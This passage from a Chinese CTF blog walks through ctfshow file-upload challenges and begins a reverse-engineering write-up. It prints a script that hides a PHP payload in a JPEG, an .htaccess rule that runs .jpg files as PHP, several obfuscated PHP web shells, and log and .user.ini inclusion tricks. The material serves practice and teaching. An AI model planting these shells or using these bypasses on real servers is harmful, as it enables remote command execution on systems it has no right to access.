&quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> =</span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                        <span class="variable">$miniPayload</span> .</span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr /><h1 id="web166-前端限制"><a href="#web166-前端限制" class="headerlink" title="web166(前端限制)"></a>web166(前端限制)</h1><p>这里经过测试发现只有zip能够上传成功！所以我们该个后缀名应该就可以了！并且过滤了php，带着php发送过去没有回显！<br><img src="https://img-blog.csdnimg.cn/20210422170540564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再访问该网页！<br><img src="https://img-blog.csdnimg.cn/20210423113531875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时使用蚁剑进行连接！<br><img src="https://img-blog.csdnimg.cn/20210423113652810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web167-htaccess配置文件"><a href="#web167-htaccess配置文件" class="headerlink" title="web167(.htaccess配置文件)"></a>web167(.htaccess配置文件)</h1><p><img src="https://img-blog.csdnimg.cn/20210423114111928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意页面发现服务器是Apache！</p><blockquote><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   <span class="comment">//将.png后缀的文件解析 成php</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210423115143429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再传jpg进去一句话木马！<br><img src="https://img-blog.csdnimg.cn/20210423115638828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们可以蚁剑或者访问该网页！<br><img src="https://img-blog.csdnimg.cn/20210423115855202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web168-基础免杀"><a href="#web168-基础免杀" class="headerlink" title="web168(基础免杀)"></a>web168(基础免杀)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_REQUEST</span>[<span class="number">1</span>]`;<span class="meta">?&gt;</span></span><br><span class="line">利用反引号执行系统命令</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);</span><br><span class="line">拼接</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">拼接</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">拼接</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">反转字符</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;);</span><br><span class="line"><span class="comment"># get传参   abs=system&amp;acos=ls</span></span><br><span class="line">数学函数</span><br></pre></td></tr></table></figure><p>上面是一些免杀的脚本！<br>过滤了关键字eval system！<br><img src="https://img-blog.csdnimg.cn/20210423121841251.png" alt="在这里插入图片描述"><br>然后访问harker.php页面！<br><img src="https://img-blog.csdnimg.cn/20210423122001306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web169-日志包含"><a href="#web169-日志包含" class="headerlink" title="web169(日志包含)"></a>web169(日志包含)</h1><p>这里是上传.user.ini这个进行文件包含！<br><img src="https://img-blog.csdnimg.cn/20210423141358274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此似我们再进行上传一个php文件！在UA里面写入一句话木马！<br><img src="https://img-blog.csdnimg.cn/20210423141635864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们便可以进行蚁剑连接！或者进行网页访问以post进行传参！<br><img src="https://img-blog.csdnimg.cn/20210423142000267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web170-user-ini包含"><a href="#web170-user-ini包含" class="headerlink" title="web170(.user.ini包含)"></a>web170(.user.ini包含)</h1><p>这个和上面的一样！不过还是有点区别的！得加个文件头来绕过！<br><img src="https://img-blog.csdnimg.cn/20210423194202965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们再上传一个php格式的文件，将UA改为一句话木马！<br><img src="https://img-blog.csdnimg.cn/20210423194444937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们再进行蚁剑！<br><img src="https://img-blog.csdnimg.cn/2021042319523643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1839243729&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>deedeedee &amp; zorropub &amp; BabyXor</title>
      <link href="posts/b7f98d36/"/>
      <url>posts/b7f98d36/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="deedeedee"><a href="#deedeedee" class="headerlink" title="deedeedee"></a>deedeedee</h1><p>这道题还是很难(简单的，flag直接给了)解压有两个文件。</p><blockquote><p>D语言最初由Digital Mars公司就职的Walter Bright于2001年发布，意图改进C++语言。目前最新D语言被简称为D2。最主要的D语言的实现是DMD。</p></blockquote><p>有个后缀名为d的文件，用记事本打开，发现有代码！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">std</span>.stdio;</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">std</span>.range;</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">std</span>.algorithm;</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">std</span>.<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">std</span>.traits;</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">std</span>.conv;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span> <span class="title">enc</span><span class="params">(<span class="built_in">string</span> key)</span> </span>&#123;</span><br><span class="line">    string enc(string s) pure @safe &#123;</span><br><span class="line">        pragma(msg, <span class="string">&quot;encrypting with key...&quot;</span>, key);</span><br><span class="line">        <span class="keyword">char</span> enc_add = cast(<span class="keyword">char</span>) (s.length.to!<span class="keyword">int</span>);</span><br><span class="line">        <span class="built_in">string</span> output = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        foreach(a,b; cycle(key).zip(s)) &#123;</span><br><span class="line">            output ~= a ^ b ^ enc_add;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">mixin <span class="keyword">template</span> <span class="title">ForeachUnrolled</span><span class="params">(<span class="built_in">string</span> F, <span class="keyword">int</span> N, <span class="keyword">int</span> MIN=<span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    pragma(msg, <span class="string">&quot;ForEach...&quot;</span>, N, <span class="string">&quot; to &quot;</span>, MIN);</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="title">if</span> <span class="params">(N &gt; <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">        mixin ForeachUnrolled!(F, N<span class="number">-1</span>, MIN); </span><br><span class="line">    &#125;</span><br><span class="line">    mixin MakeFunction!(F, N);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">mixin <span class="keyword">template</span> <span class="title">MakeFunction</span><span class="params">(<span class="built_in">string</span> F, alias T)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Convert $ and %</span></span><br><span class="line">    mixin(translate(F, [<span class="string">&#x27;$&#x27;</span> : T.to!(<span class="built_in">string</span>), <span class="string">&#x27;%&#x27;</span> : (T<span class="number">-1</span>).to!<span class="built_in">string</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string encrypt(string s) pure @safe &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> n = <span class="number">499</span>; <span class="comment">// 500 is DMD&#x27;s template recursion limit</span></span><br><span class="line">    <span class="comment">//const int n = 30;</span></span><br><span class="line">    <span class="built_in">string</span> output_0 = s; <span class="comment">// base case with our string</span></span><br><span class="line">    mixin ForeachUnrolled!(<span class="string">&quot;string output_$ = enc!($$$.to!string)(output_%);&quot;</span>, n);</span><br><span class="line">    mixin(<span class="string">&quot;return output_&quot;</span> ~ n.to!<span class="built_in">string</span> ~ <span class="string">&quot;;&quot;</span>);</span><br><span class="line">&#125;</span><br><span 